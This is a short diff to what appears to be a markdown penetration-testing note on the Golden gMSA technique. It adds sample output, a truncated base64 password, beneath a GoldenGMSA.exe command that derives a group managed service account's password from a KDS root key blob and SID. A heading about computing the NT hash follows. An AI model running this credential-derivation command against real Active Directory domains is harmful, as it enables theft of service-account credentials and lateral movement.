@@ -25,6 +25,8 @@ Base64 blob:    AQAAAAKWIwOWqx/TP+Yk6oGaZvYAAAAAAQAAAAA[..snip..]
 
 ```bash
 GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey BASE64_BLOB_DATA --pwdid MSDS-MANAGEDPASSWORDID
+
+Base64 Encoded Password:        ZSWQIz5mLbEcw6mm8J49DWCADxDT703UPFLbRftDTqE7WzAf[..snip..]
 ```
 
 **Calculage NT HASH**
